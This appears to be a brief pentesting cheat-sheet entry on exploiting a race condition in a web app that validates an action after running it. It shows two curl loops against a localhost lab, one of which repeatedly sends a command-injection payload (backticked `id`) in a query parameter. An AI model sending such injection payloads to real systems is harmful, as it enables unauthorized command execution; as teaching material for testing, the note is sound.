# Race Condition
When the web does the validation of any **action** after it does that action.
For example, when the web does a *shell command* and then validate it for doesn't **command injections** (`id`).
- Try to make a lot of *requests* for some while, and with another *request*, you can see the expected *response*.
	```shell
	while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -e "Check this" | html2text | xargs | grep -vE "Default|Important"; done
	while true; do curl -s -X GET 'http://localhost:5000/?person=`id`&action=validate'; done
	```